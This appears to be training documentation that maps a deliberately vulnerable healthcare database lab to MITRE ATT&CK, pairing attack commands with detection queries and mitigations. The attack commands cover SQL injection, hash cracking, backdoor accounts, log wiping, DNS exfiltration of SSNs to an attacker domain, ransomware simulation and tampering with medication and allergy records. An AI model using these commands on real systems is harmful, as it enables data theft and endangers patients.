# MITRE ATT&CK Mapping - Healthcare Database

## Overview

This document maps the intentional vulnerabilities in the MEDUSA Healthcare Lab database to the MITRE ATT&CK framework. The database demonstrates multiple techniques across various tactics.

**Framework Version:** ATT&CK v14  
**Focus Areas:** Enterprise, Cloud (partial)  
**Environment:** Healthcare sector, database security

---

## Tactics and Techniques Summary

| Tactic | Techniques | Count |
|--------|-----------|-------|
| Initial Access | T1078, T1190 | 2 |
| Execution | T1059.006 | 1 |
| Persistence | T1078, T1136 | 2 |
| Privilege Escalation | T1068, T1078 | 2 |
| Defense Evasion | T1070.001, T1078 | 2 |
| Credential Access | T1110, T1552, T1003 | 3 |
| Discovery | T1046, T1083, T1087 | 3 |
| Lateral Movement | T1078 | 1 |
| Collection | T1005, T1213 | 2 |
| Exfiltration | T1048, T1567 | 2 |
| Impact | T1485, T1486, T1491, T1565 | 4 |

**Total Techniques Demonstrated:** 18 unique techniques

---

## Detailed Technique Mapping

### Initial Access (TA0001)

#### T1078: Valid Accounts

**Sub-technique:** T1078.001 - Default Accounts

**Description:** Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.

**Implementation in Lab:**
- Multiple weak/default credentials available
- No account lockout policy
- Predictable password patterns

**Vulnerable Accounts:**
```
root / admin123          - Full MySQL access
ehrapp / Welcome123!     - ALL PRIVILEGES on healthcare_db
backup / backup123       - SELECT, LOCK TABLES
reporting / reports      - SELECT only
dev / dev                - ALL PRIVILEGES (should not exist)
admin / password         - Application admin (MD5 hash)
doctor1 / 123456         - Application user (MD5 hash)
```

**Detection:**
```sql
-- Monitor for unusual login patterns
SELECT user_id, username, COUNT(*) as login_count,
       COUNT(DISTINCT ip_address) as unique_ips
FROM audit_log
WHERE action = 'LOGIN'
  AND timestamp > NOW() - INTERVAL 24 HOUR
GROUP BY user_id, username
HAVING unique_ips > 3;

-- Check for off-hours access
SELECT username, action, ip_address, timestamp
FROM audit_log
WHERE HOUR(timestamp) BETWEEN 0 AND 5;
```

**Mitigation:**
- Implement strong password policy
- Enable account lockout after failed attempts
- Use multi-factor authentication
- Remove default accounts
- Rotate credentials regularly

---

#### T1190: Exploit Public-Facing Application

**Description:** Adversaries may attempt to exploit a weakness in an Internet-facing application.

**Implementation in Lab:**
- SQL injection vulnerabilities in web application
- Exposed MySQL port (3306) to external network
- No input validation

**Example Vulnerable Code:**
```php
// VULNERABLE - DO NOT USE
$query = "SELECT * FROM patients WHERE id = " . $_GET['id'];

// Exploit:
// ?id=1' UNION SELECT username,password_hash FROM users--
```

**Detection:**
```sql
-- Monitor for SQL injection patterns in query log
grep -E "(UNION|SELECT.*FROM.*WHERE.*OR|'|--)" /var/log/mysql/query.log

-- Application-level WAF rules
ModSecurity: Look for SQL injection signatures
```

**Mitigation:**
- Use prepared statements/parameterized queries
- Implement input validation and sanitization
- Deploy Web Application Firewall (WAF)
- Close unnecessary ports (3306 should not be public)
- Use least privilege database accounts

---

### Execution (TA0002)

#### T1059.006: Command and Scripting Interpreter - Python

**Description:** Adversaries may abuse Python to execute malicious payloads.

**Implementation in Lab:**
- Exploitation scripts can be written in Python
- MySQL Python connector enables automation

**Example:**
```python
# Automated exploitation script
import mysql.connector
conn = mysql.connector.connect(
    host="target",
    user="backup",
    password="backup123",
    database="healthcare_db"
)
# Exfiltrate data...
```

**Detection:**
- Monitor for suspicious Python processes accessing database
- Network traffic analysis for unusual database connections
- Process monitoring for mysql-connector-python usage

**Mitigation:**
- Network segmentation (database not accessible from all hosts)
- Application whitelisting
- Endpoint detection and response (EDR)

---

### Persistence (TA0003)

#### T1078: Valid Accounts

**Description:** Adversaries may create or compromise accounts to maintain access.

**Implementation in Lab:**
- Attackers with ALL PRIVILEGES can create backdoor accounts
- No monitoring of user creation events

**Attack Example:**
```sql
-- Create persistent backdoor
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'complex_secret_password';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

**Detection:**
```sql
-- Monitor mysql.general_log for user creation
SELECT argument, event_time
FROM mysql.general_log
WHERE argument LIKE '%CREATE USER%'
   OR argument LIKE '%GRANT%';

-- Alert on new users
SELECT user, host, authentication_string
FROM mysql.user
WHERE Create_time > NOW() - INTERVAL 24 HOUR;
```

**Mitigation:**
- Implement least privilege (no users with CREATE USER)
- Enable audit logging for privilege changes
- Regular user account audits
- Alert on new account creation

---

#### T1136: Create Account

**Sub-technique:** T1136.001 - Local Account

**Description:** Adversaries may create accounts to maintain access.

**Implementation in Lab:**
- Overly permissive application user (`ehrapp`) has CREATE USER privilege
- No approval workflow for new accounts

**Detection:**
```bash
# MySQL audit log
grep "CREATE USER" /var/log/mysql/mysql-audit.log

# Compare current users with baseline
mysql -u admin -p -e "SELECT user, host FROM mysql.user;" > current_users.txt
diff baseline_users.txt current_users.txt
```

**Mitigation:**
- Revoke CREATE USER privilege from application accounts
- Implement approval workflow for account creation
- Use separate admin account for user management

---

### Privilege Escalation (TA0004)

#### T1068: Exploitation for Privilege Escalation

**Description:** Adversaries may exploit software vulnerabilities to elevate privileges.

**Implementation in Lab:**
- Application user (`ehrapp`) has excessive privileges (ALL PRIVILEGES)
- Can escalate from read-only user to admin by harvesting credentials

**Attack Path:**
```
1. Compromise 'reporting' user (SELECT only)
2. Query comments table → find plaintext admin password
3. Authenticate with admin credentials
4. Now have full control
```

**Example:**
```sql
-- As 'reporting' user:
SELECT plaintext_credential 
FROM comments 
WHERE plaintext_credential LIKE '%db_admin%';

-- Result: db_admin_password: MedC@re2024

-- Disconnect and reconnect with elevated privileges
```

**Detection:**
```sql
-- Monitor for privilege escalation attempts
SELECT user_id, action, table_name, ip_address
FROM audit_log
WHERE action IN ('GRANT', 'CREATE USER', 'ALTER USER')
ORDER BY timestamp DESC;
```

**Mitigation:**
- Principle of least privilege
- Remove plaintext credentials from database
- Implement secrets management (Vault, AWS Secrets Manager)
- Separate read-only and administrative access

---

#### T1078.003: Valid Accounts - Local Accounts

**Description:** Adversaries may obtain and abuse credentials of local accounts.

**Implementation in Lab:**
- Weak password hashing (MD5) enables easy cracking
- No salt added to password hashes
- Common passwords used

**Attack:**
```bash
# Extract hashes
mysql -u reporting -preports -e \
  "SELECT username, password_hash FROM users" > hashes.txt

# Crack with hashcat (instant for weak passwords)
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Results:
# admin:password
# doctor1:123456
# sysadmin:admin
```

**Detection:**
- Monitor for mass password hash queries
- Alert on access to `users` table from non-admin accounts
- Failed login attempt monitoring

**Mitigation:**
- Use bcrypt or Argon2 for password hashing
- Implement salt + pepper
- Enforce strong password policy
- Multi-factor authentication (MFA)

---

### Defense Evasion (TA0005)

#### T1070.001: Indicator Removal - Clear System Logs

**Description:** Adversaries may delete or modify logs to evade detection.

**Implementation in Lab:**
- Attackers with ALL PRIVILEGES can clear audit logs
- Insufficient audit logging
- No log integrity protection

**Attack:**
```sql
-- Clear tracks
TRUNCATE TABLE audit_log;

-- Or selective deletion
DELETE FROM audit_log WHERE user_id = 2 AND action = 'LOGIN';
```

**Detection:**
- Monitor for TRUNCATE or large DELETE operations on audit tables
- Use external SIEM for log aggregation
- File integrity monitoring on log files

**Mitigation:**
- Write-once audit logs (WORM storage)
- Forward logs to external SIEM in real-time
- Restrict DELETE/TRUNCATE on audit tables
- Immutable audit log plugin

---

#### T1078: Valid Accounts

**Description:** Using legitimate credentials to blend in with normal activity.

**Implementation in Lab:**
- Compromised credentials allow attacker to appear legitimate
- Minimal behavioral analysis

**Detection:**
```sql
-- Behavioral anomaly detection
-- Unusual query patterns for a user
SELECT user_id, COUNT(*) as query_count
FROM audit_log
WHERE timestamp > NOW() - INTERVAL 1 HOUR
GROUP BY user_id
HAVING query_count > (
    SELECT AVG(query_count) * 3
    FROM (
        SELECT user_id, COUNT(*) as query_count
        FROM audit_log
        WHERE timestamp > NOW() - INTERVAL 7 DAY
        GROUP BY user_id, DATE(timestamp)
    ) as baseline
);
```

**Mitigation:**
- User and Entity Behavior Analytics (UEBA)
- Baseline normal behavior for each account
- Alert on deviations from baseline

---

### Credential Access (TA0006)

#### T1110: Brute Force

**Sub-techniques:**
- T1110.001 - Password Guessing
- T1110.002 - Password Cracking

**Description:** Adversaries may use brute force techniques to gain access.

**Implementation in Lab:**

**Password Guessing:**
- No account lockout policy
- Weak passwords vulnerable to dictionary attacks
- No rate limiting on authentication attempts

```bash
# Brute force attack
hydra -l root -P common_passwords.txt mysql://target:3306
```

**Password Cracking:**
- MD5 hashes extracted from database
- Fast cracking (billions of hashes/second)

```bash
# Extract and crack
hashcat -m 0 -a 0 hashes.txt rockyou.txt
# Cracks weak passwords in seconds
```

**Detection:**
```sql
-- Failed login attempts
SELECT ip_address, COUNT(*) as failed_attempts
FROM audit_log
WHERE action = 'FAILED_LOGIN'
  AND timestamp > NOW() - INTERVAL 1 HOUR
GROUP BY ip_address
HAVING failed_attempts > 5;
```

**Mitigation:**
- Account lockout policy (5 failed attempts = 30 min lockout)
- Rate limiting on authentication
- Strong password hashing (bcrypt, Argon2)
- MFA required
- CAPTCHA after failed attempts

---

#### T1552: Unsecured Credentials

**Sub-techniques:**
- T1552.001 - Credentials In Files
- T1552.004 - Private Keys

**Description:** Adversaries may search compromised systems for insecurely stored credentials.

**Implementation in Lab:**

**T1552.001 - Credentials In Files:**
- Plaintext passwords in `comments` table
- Credentials in environment variables (`.env`, `docker-compose.yml`)
- Configuration files with credentials

**Example:**
```sql
-- Extract plaintext credentials
SELECT comment_text, plaintext_credential 
FROM comments 
WHERE plaintext_credential IS NOT NULL;

-- Results:
-- db_admin_password: MedC@re2024
-- backup_server: ftpadmin / FtpB@ckup123  
-- ldap_service: cn=admin,dc=medcare,dc=local / LdapAdm1n!
-- vpn_username: remote_access / Vpn@ccess2024
-- ehr_app_root: ehrroot / Ehr@pp2024!
```

**Detection:**
```sql
-- Monitor access to comments table
SELECT user_id, username, COUNT(*) as access_count
FROM audit_log
WHERE table_name = 'comments'
  AND action = 'VIEW_TABLE'
  AND timestamp > NOW() - INTERVAL 24 HOUR
GROUP BY user_id, username;
```

**Mitigation:**
- **NEVER** store plaintext passwords in database
- Use secrets management systems (HashiCorp Vault, AWS Secrets Manager)
- Encrypt configuration files
- Use environment-specific key vaults
- Regular credential rotation

---

#### T1003: OS Credential Dumping

**Sub-technique:** T1003.007 - Proc Filesystem

**Description:** Adversaries may dump credentials from MySQL memory or process.

**Implementation in Lab:**
- If container is compromised, can dump MySQL process memory
- Credentials may be in memory during authentication

**Attack:**
```bash
# If attacker has access to MySQL server
# Dump process memory
gcore $(pidof mysqld)
strings core.* | grep -i password

# Or memory dump
cat /proc/$(pidof mysqld)/environ | tr '\0' '\n' | grep -i pass
```

**Detection:**
- Process monitoring for memory dump tools (gcore, procdump)
- Alert on access to /proc/[mysqld_pid]/mem

**Mitigation:**
- Container isolation
- Prevent privilege escalation in container
- Memory encryption (rare for databases)
- Principle of least privilege on host OS

---

### Discovery (TA0007)

#### T1046: Network Service Discovery

**Description:** Adversaries may attempt to get a listing of services running on remote hosts.

**Implementation in Lab:**
- MySQL port 3306 exposed to network
- Banner reveals version information

**Attack:**
```bash
# Port scan
nmap -sV -p 3306 target-host

# Results:
# 3306/tcp open  mysql   MySQL 8.0
```

**Detection:**
- Network intrusion detection system (NIDS)
- Firewall logs showing port scans
- Honeypot services

**Mitigation:**
- Close unnecessary ports
- Bind MySQL to localhost only (or internal network)
- Firewall rules restricting access
- Port knocking for administrative access

---

#### T1083: File and Directory Discovery

**Description:** Adversaries may enumerate files and directories.

**Implementation in Lab:**
- Database enumeration via SQL queries
- List all databases, tables, columns

**Attack:**
```sql
-- Enumerate databases
SHOW DATABASES;

-- Enumerate tables
SHOW TABLES FROM healthcare_db;

-- Describe table structure
DESCRIBE patients;

-- Find sensitive columns
SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPE
FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA = 'healthcare_db'
  AND (COLUMN_NAME LIKE '%ssn%' 
    OR COLUMN_NAME LIKE '%password%'
    OR COLUMN_NAME LIKE '%credit%');
```

**Detection:**
```sql
-- Monitor for reconnaissance queries
SELECT user_id, argument
FROM mysql.general_log
WHERE argument LIKE '%information_schema%'
   OR argument LIKE '%SHOW DATABASES%'
   OR argument LIKE '%SHOW TABLES%';
```

**Mitigation:**
- Restrict access to information_schema
- Monitoring and alerting for enumeration queries
- Principle of least privilege

---

#### T1087: Account Discovery

**Sub-technique:** T1087.001 - Local Account

**Description:** Adversaries may attempt to get a listing of accounts.

**Implementation in Lab:**
- Query users table for application accounts
- Query mysql.user for database accounts

**Attack:**
```sql
-- Application users
SELECT username, role, email, is_active FROM users;

-- Database users
SELECT user, host, authentication_string 
FROM mysql.user;
```

**Detection:**
```sql
-- Monitor queries to user-related tables
SELECT user_id, argument
FROM mysql.general_log
WHERE argument LIKE '%mysql.user%'
   OR (argument LIKE '%SELECT%' AND argument LIKE '%users%');
```

**Mitigation:**
- Restrict SELECT on mysql.user to admins only
- Obfuscate user enumeration (return generic errors)

---

### Lateral Movement (TA0010)

#### T1078: Valid Accounts

**Description:** Adversaries may use alternate credentials to move laterally.

**Implementation in Lab:**
- Credentials harvested from database used to access other systems
- FTP, LDAP, VPN, SSH credentials in plaintext

**Attack Flow:**
```
1. Compromise database (any read access)
2. Query comments table
3. Extract credentials:
   - FTP: ftpadmin / FtpB@ckup123
   - LDAP: cn=admin,dc=medcare,dc=local / LdapAdm1n!
   - VPN: remote_access / Vpn@ccess2024
   - SSH: ehrroot / Ehr@pp2024!
4. Use credentials to access other systems
5. Pivot through network
```

**Example:**
```bash
# After harvesting credentials from database:

# Access FTP server
ftp target-host
Username: ftpadmin
Password: FtpB@ckup123

# Access LDAP
ldapsearch -x -H ldap://target:389 \
  -D "cn=admin,dc=medcare,dc=local" \
  -w "LdapAdm1n!" \
  -b "dc=medcare,dc=local"

# SSH to application server
ssh ehrroot@ehr-webapp-server
Password: Ehr@pp2024!
```

**Detection:**
- Correlate database access with subsequent authentication attempts on other systems
- Monitor for unusual authentication patterns
- Alert on same source IP accessing multiple different services

**Mitigation:**
- Credential segmentation (unique passwords per service)
- Remove plaintext credentials from database
- Network segmentation
- Monitor for credential reuse across services

---

### Collection (TA0009)

#### T1005: Data from Local System

**Description:** Adversaries may search local system for data of interest.

**Implementation in Lab:**
- Direct access to MySQL data files if container is compromised
- Database files contain unencrypted PHI

**Attack:**
```bash
# If attacker has shell access to MySQL container:
cd /var/lib/mysql/healthcare_db

# MySQL table files (.ibd files contain data)
ls -lh patients.ibd
ls -lh medical_records.ibd

# Copy files
tar czf /tmp/db_files.tar.gz /var/lib/mysql/healthcare_db

# Exfiltrate
# Can read .ibd files with MySQL tools even without running MySQL
```

**Detection:**
- File integrity monitoring on MySQL data directory
- Alert on unauthorized access to /var/lib/mysql
- Container security monitoring

**Mitigation:**
- Encryption at rest (MySQL transparent data encryption)
- Container isolation and hardening
- Principle of least privilege on filesystem
- Read-only MySQL data directory where possible

---

#### T1213: Data from Information Repositories

**Description:** Adversaries may collect data from information repositories.

**Implementation in Lab:**
- Database contains valuable PHI: SSNs, diagnoses, medications
- 50 patients with complete medical records
- Billing information including partial credit card numbers

**High-Value Data:**
```sql
-- Social Security Numbers (50 count)
SELECT COUNT(*) FROM patients WHERE ssn IS NOT NULL;

-- Medical diagnoses
SELECT COUNT(*) FROM medical_records WHERE diagnosis IS NOT NULL;

-- Prescription medications
SELECT COUNT(*) FROM prescriptions WHERE status='active';

-- Billing/credit card data
SELECT COUNT(*) FROM billing WHERE credit_card_last4 IS NOT NULL;
```

**Exfiltration:**
```sql
-- Complete PHI dump
SELECT 
    p.first_name, p.last_name, p.ssn, p.dob,
    m.diagnosis, m.medications, m.doctor_notes
FROM patients p
LEFT JOIN medical_records m ON p.id = m.patient_id
INTO OUTFILE '/tmp/complete_phi_breach.csv';
```

**Impact:**
- 50 identity theft victims
- HIPAA violation ($100 - $50,000 per record)
- Average breach cost: $429 per record
- Total estimated cost: $21,450+
- Reputation damage
- Legal liability

**Detection:**
```sql
-- Monitor for large data exports
SELECT user_id, COUNT(*) as row_count
FROM audit_log
WHERE action LIKE '%SELECT%'
  AND timestamp > NOW() - INTERVAL 1 HOUR
GROUP BY user_id
HAVING row_count > 1000;

-- Alert on INTO OUTFILE usage
grep "INTO OUTFILE" /var/log/mysql/query.log
```

**Mitigation:**
- Data classification and labeling
- Encryption for sensitive data (SSN, PHI)
- Data loss prevention (DLP) tools
- Query result size limits
- Monitor and alert on bulk data access

---

### Exfiltration (TA0010)

#### T1048: Exfiltration Over Alternative Protocol

**Description:** Adversaries may steal data using protocols not commonly monitored.

**Implementation in Lab:**
- DNS exfiltration via MySQL queries
- SQL queries can trigger DNS lookups

**Attack:**
```sql
-- DNS exfiltration
-- Each SSN causes DNS query to attacker-controlled domain
SELECT CONCAT(
    REPLACE(ssn, '-', ''),
    '.exfil.attacker.com'
) FROM patients;

-- Generates DNS queries like:
-- 123456789.exfil.attacker.com
-- 987654321.exfil.attacker.com
-- Attacker's DNS server logs contain all SSNs
```

**Other alternative protocols:**
- FTP (using INTO OUTFILE + FTP)
- SMTP (if MySQL can send emails)
- HTTP (via UDF or LOAD_FILE)

**Detection:**
```bash
# Monitor DNS queries from database server
tcpdump -i any port 53 -w dns.pcap

# Analyze for suspicious patterns
# High volume of DNS queries to same domain
# Queries with data in subdomain
```

**Mitigation:**
- Restrict database server's network access
- DNS filtering and monitoring
- No outbound internet for database server
- Application-layer firewall

---

#### T1567: Exfiltration Over Web Service

**Description:** Adversaries may exfiltrate data via web services.

**Implementation in Lab:**
- Use application API to extract data
- Scripted extraction via HTTP requests

**Attack:**
```python
# Exfiltrate via web API
import requests

for patient_id in range(1, 51):
    response = requests.get(
        f'http://target/api/patient/{patient_id}',
        auth=('doctor1', '123456')
    )
    
    if response.status_code == 200:
        # Save PHI
        with open(f'patient_{patient_id}.json', 'w') as f:
            f.write(response.text)

# 50 API calls = complete PHI breach
```

**Detection:**
```bash
# Web server access logs
# High volume of API calls from single IP
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head

# Unusual API usage patterns
# Accessing all patients sequentially
grep "/api/patient/" access.log | wc -l
```

**Mitigation:**
- API rate limiting
- Authentication and authorization
- Monitor for unusual API access patterns
- Web Application Firewall (WAF)
- Require MFA for API access

---

### Impact (TA0040)

#### T1485: Data Destruction

**Description:** Adversaries may destroy data to disrupt operations.

**Implementation in Lab:**
- Attackers with ALL PRIVILEGES can drop tables
- No backup verification
- Cascading deletes can wipe related data

**Attack:**
```sql
-- Connect with elevated privileges
mysql -u ehrapp -pWelcome123! healthcare_db

-- Destroy patient data
DROP TABLE IF EXISTS patients CASCADE;

-- Destroy medical records
DROP TABLE IF EXISTS medical_records;

-- Destroy all tables
DROP DATABASE healthcare_db;
```

**Impact:**
- Complete data loss
- Patient care disruption
- Hospital operations halted
- Potential patient safety incidents
- Recovery depends on backup availability

**Detection:**
```sql
-- Monitor for DROP statements
SELECT user_id, username, argument
FROM mysql.general_log
WHERE argument LIKE '%DROP TABLE%'
   OR argument LIKE '%DROP DATABASE%'
   OR argument LIKE '%TRUNCATE%';
```

**Mitigation:**
- Principle of least privilege (no DROP for application users)
- Regular tested backups
- Point-in-time recovery capability
- Database snapshots
- Audit logging before destructive operations
- Confirmation required for DROP statements

---

#### T1486: Data Encrypted for Impact (Ransomware)

**Description:** Adversaries may encrypt data to demand ransom.

**Implementation in Lab:**
- Application user can rename tables
- Can "encrypt" by moving data and leaving ransom note

**Attack:**
```sql
-- Ransomware simulation
-- Step 1: Backup data (attacker keeps copy)
CREATE TABLE patients_backup AS SELECT * FROM patients;
CREATE TABLE medical_records_backup AS SELECT * FROM medical_records;

-- Step 2: "Encrypt" by renaming tables
RENAME TABLE patients TO patients_encrypted_20240128;
RENAME TABLE medical_records TO medical_records_encrypted_20240128;
RENAME TABLE prescriptions TO prescriptions_encrypted_20240128;

-- Step 3: Create ransom note
CREATE TABLE patients (
    id INT PRIMARY KEY AUTO_INCREMENT,
    message TEXT
);

INSERT INTO patients (message) VALUES 
('YOUR DATABASE HAS BEEN ENCRYPTED'),
('All patient data is encrypted and cannot be recovered'),
('Send 10 Bitcoin to: [BTC ADDRESS]'),
('You have 72 hours before data is permanently deleted'),
('PATIENT LIVES ARE AT RISK - PAY IMMEDIATELY');
```

**Impact:**
- Hospital operations completely halted
- Patient care disrupted
- Life-threatening if critical systems affected
- Ransom payment pressure
- Public relations disaster
- Regulatory fines

**Detection:**
```sql
-- Monitor for mass table renames
SELECT COUNT(*) as rename_count
FROM mysql.general_log
WHERE argument LIKE '%RENAME TABLE%'
  AND event_time > NOW() - INTERVAL 5 MINUTE;

-- Alert on suspicious table names
SELECT TABLE_NAME 
FROM information_schema.TABLES
WHERE TABLE_NAME LIKE '%encrypted%'
   OR TABLE_NAME LIKE '%locked%'
   OR TABLE_NAME LIKE '%ransom%';
```

**Mitigation:**
- Offline, immutable backups (air-gapped)
- Regular backup testing
- Incident response plan for ransomware
- Principle of least privilege (no RENAME for app users)
- Database snapshots in separate region/account
- Network segmentation (ransomware can't spread)

---

#### T1491: Defacement

**Description:** Adversaries may modify data to deface it or leave messages.

**Implementation in Lab:**
- Attackers can modify patient records
- Changes to medical data can be life-threatening

**Attack:**
```sql
-- Modify patient records (dangerous)
UPDATE patients 
SET medical_notes = 'This patient has been HACKED'
WHERE id = 1;

-- Change medication information (life-threatening!)
UPDATE prescriptions 
SET medication_name = 'TAMPERED',
    dosage = 'UNSAFE'
WHERE patient_id = 1;

-- Modify allergy information (potentially fatal!)
UPDATE patients 
SET allergies = 'NO KNOWN ALLERGIES'
WHERE allergies IS NOT NULL;
```

**Impact:**
- **CRITICAL:** Patient safety at risk
- Incorrect medications administered
- Allergic reactions (potentially fatal)
- Medical malpractice liability
- Loss of trust in healthcare system
- Regulatory consequences

**Detection:**
```sql
-- Monitor for mass updates
SELECT user_id, COUNT(*) as update_count
FROM audit_log
WHERE action = 'UPDATE'
  AND table_name IN ('patients', 'prescriptions', 'medical_records')
  AND timestamp > NOW() - INTERVAL 1 HOUR
GROUP BY user_id
HAVING update_count > 10;

-- Integrity checking
-- Baseline checksums of critical data
-- Alert on unexpected changes
```

**Mitigation:**
- Data integrity monitoring
- Change approval workflow for critical data
- Checksums/hashes for critical records
- Version control / audit trail for all changes
- Real-time alerts for modifications to allergy/medication data
- Read-only replicas for reporting

---

#### T1565: Data Manipulation

**Sub-technique:** T1565.001 - Stored Data Manipulation

**Description:** Adversaries may modify data to manipulate outcomes.

**Implementation in Lab:**
- Subtle changes to medical records
- Billing fraud
- Insurance fraud

**Attack:**
```sql
-- Billing fraud
UPDATE billing 
SET amount = amount * 1.1
WHERE payment_status = 'pending';

-- Insurance fraud
UPDATE patients 
SET insurance_provider = 'Medicare'
WHERE insurance_provider = 'Private Insurance';

-- Hide diagnoses
UPDATE medical_records 
SET diagnosis = 'General Checkup'
WHERE diagnosis LIKE '%cancer%';

-- Modify lab results
UPDATE lab_results 
SET result_value = 'Normal'
WHERE status = 'abnormal';
```

**Impact:**
- Financial fraud
- Insurance fraud (federal crime)
- Incorrect medical decisions
- Delayed treatment (patient harm)
- Audit failures
- Legal liability

**Detection:**
```sql
-- Statistical anomaly detection
-- Unusual patterns in billing
SELECT AVG(amount), STDDEV(amount)
FROM billing
WHERE billing_date > NOW() - INTERVAL 30 DAY;

-- Compare to historical baseline
-- Alert on significant deviations

-- Data integrity checks
-- Periodic reconciliation against source systems
```

**Mitigation:**
- Data validation rules
- Change detection and alerting
- Regular data integrity audits
- Separation of duties
- Approval workflows for financial data changes
- Immutable audit logs

---

## Attack Flow Diagram

```
┌────────────────────────────────────────────────────────────┐
│                   ATTACK KILL CHAIN                        │
│              MITRE ATT&CK Tactics Mapped                   │
└────────────────────────────────────────────────────────────┘

[Reconnaissance]
      │
      ├─> Port Scan (T1046)
      │   └─> Find MySQL on 3306
      │
      └─> Service Enumeration
          └─> MySQL 8.0 identified

[Initial Access] - TA0001
      │
      ├─> T1078: Weak Credentials
      │   ├─> root / admin123
      │   ├─> ehrapp / Welcome123!
      │   └─> backup / backup123
      │
      └─> T1190: SQL Injection (via web app)

[Execution] - TA0002
      │
      └─> T1059.006: Python scripts
          └─> Automated exploitation

[Persistence] - TA0003
      │
      ├─> T1078: Use valid credentials
      │
      └─> T1136: Create backdoor user
          └─> CREATE USER 'backdoor'...

[Privilege Escalation] - TA0004
      │
      ├─> T1078.003: Crack MD5 hashes
      │   └─> Gain admin access
      │
      └─> T1068: Abuse ALL PRIVILEGES
          └─> ehrapp can GRANT privileges

[Defense Evasion] - TA0005
      │
      ├─> T1070.001: Clear audit logs
      │   └─> TRUNCATE audit_log
      │
      └─> T1078: Use legitimate credentials
          └─> Blend in with normal traffic

[Credential Access] - TA0006
      │
      ├─> T1110: Brute Force
      │   ├─> T1110.001: Password guessing
      │   └─> T1110.002: Hash cracking (MD5)
      │
      ├─> T1552: Plaintext credentials
      │   └─> SELECT * FROM comments
      │       WHERE plaintext_credential IS NOT NULL
      │
      └─> T1003: Memory dump (if container access)

[Discovery] - TA0007
      │
      ├─> T1046: Network scanning
      │
      ├─> T1083: Database enumeration
      │   ├─> SHOW DATABASES
      │   ├─> SHOW TABLES
      │   └─> DESCRIBE tables
      │
      └─> T1087: Account discovery
          └─> SELECT * FROM mysql.user

[Lateral Movement] - TA0010
      │
      └─> T1078: Use harvested credentials
          ├─> FTP: ftpadmin / FtpB@ckup123
          ├─> LDAP: admin / LdapAdm1n!
          ├─> VPN: remote_access / Vpn@ccess2024
          └─> SSH: ehrroot / Ehr@pp2024!

[Collection] - TA0009
      │
      ├─> T1005: Access MySQL data files
      │   └─> /var/lib/mysql/healthcare_db/*.ibd
      │
      └─> T1213: Query PHI data
          ├─> 50 SSNs
          ├─> 200+ medical records
          └─> Billing data

[Exfiltration] - TA0010
      │
      ├─> T1048: Alternative protocols
      │   ├─> DNS exfiltration
      │   ├─> INTO OUTFILE
      │   └─> mysqldump
      │
      └─> T1567: Web service
          └─> API scripted extraction

[Impact] - TA0040
      │
      ├─> T1485: Data destruction
      │   └─> DROP TABLE patients
      │
      ├─> T1486: Ransomware
      │   └─> RENAME TABLE ... _encrypted
      │
      ├─> T1491: Defacement
      │   └─> UPDATE patients SET ...
      │
      └─> T1565: Data manipulation
          └─> Billing fraud, modify records
```

---

## Detection Strategy Matrix

| Technique | Detection Method | Tool/Query | Alert Priority |
|-----------|------------------|------------|----------------|
| T1078 | Failed login monitoring | Audit log query | High |
| T1190 | SQL injection patterns | WAF, query log | Critical |
| T1136 | New user creation | mysql.general_log | Critical |
| T1068 | Privilege changes | GRANT/CREATE USER logs | Critical |
| T1070.001 | Log deletion | File integrity monitoring | Critical |
| T1110 | Brute force attempts | Connection attempts | High |
| T1552 | Access to comments table | Audit log | Critical |
| T1003 | Process memory access | Host IDS | High |
| T1046 | Port scanning | Network IDS | Medium |
| T1083 | Database enumeration | SHOW/DESCRIBE queries | Medium |
| T1087 | User enumeration | mysql.user queries | Medium |
| T1005 | File access | File integrity monitor | High |
| T1213 | Bulk data queries | Query result size | High |
| T1048 | DNS exfiltration | DNS monitoring | High |
| T1567 | API abuse | WAF, rate limiting | Medium |
| T1485 | DROP statements | Query log | Critical |
| T1486 | Table renaming | RENAME TABLE logs | Critical |
| T1491 | Data modification | Integrity checks | Critical |
| T1565 | Subtle changes | Statistical analysis | High |

---

## Defensive Recommendations by Tactic

### Initial Access

✅ Strong authentication (no weak passwords)  
✅ MFA for all administrative access  
✅ Account lockout policy  
✅ Close MySQL port 3306 to external network  
✅ Input validation (prevent SQL injection)  
✅ Web Application Firewall (WAF)  

### Persistence

✅ Principle of least privilege (no CREATE USER for app users)  
✅ Monitor and alert on new account creation  
✅ Regular account audits  
✅ Disable unused accounts  

### Privilege Escalation

✅ Strong password hashing (bcrypt/Argon2, not MD5)  
✅ Remove plaintext credentials from database  
✅ Secrets management system (Vault)  
✅ Least privilege for all database users  

### Defense Evasion

✅ Immutable audit logs (WORM storage)  
✅ Forward logs to external SIEM  
✅ Restrict DELETE/TRUNCATE on audit tables  
✅ File integrity monitoring  

### Credential Access

✅ Bcrypt/Argon2 with salt and pepper  
✅ Rate limiting on authentication  
✅ MFA  
✅ No plaintext credentials anywhere  

### Discovery

✅ Restrict access to information_schema  
✅ Monitor enumeration queries  
✅ Obfuscate error messages  

### Collection & Exfiltration

✅ Data classification and encryption  
✅ Query result size limits  
✅ Network segmentation (no outbound from DB)  
✅ Data Loss Prevention (DLP)  
✅ Monitor bulk data access  

### Impact

✅ Regular tested backups  
✅ Offline, immutable backups  
✅ No DROP/TRUNCATE for application users  
✅ Data integrity monitoring  
✅ Approval workflows for critical data changes  

---

## Compliance Mapping

| Framework | Relevant Controls | Lab Violations |
|-----------|-------------------|----------------|
| HIPAA | §164.312(a)(2)(i) - Access Control | Weak passwords, no MFA |
| HIPAA | §164.312(c)(1) - Integrity | No data integrity checks |
| HIPAA | §164.312(b) - Audit Controls | Insufficient logging |
| HIPAA | §164.312(e)(1) - Transmission Security | Unencrypted data |
| PCI-DSS | Req 8 - User Authentication | MD5 hashing, weak passwords |
| PCI-DSS | Req 10 - Log & Monitor | Clearable audit logs |
| NIST CSF | PR.AC - Access Control | Overly permissive users |
| NIST CSF | PR.DS - Data Security | Unencrypted SSNs, PHI |
| NIST CSF | DE.CM - Monitoring | Minimal detection |
| ISO 27001 | A.9.4 - Access Management | No least privilege |

---

## Summary

The MEDUSA Healthcare Lab database demonstrates **18 MITRE ATT&CK techniques** across **11 tactics**:

**Highest Risk Techniques:**
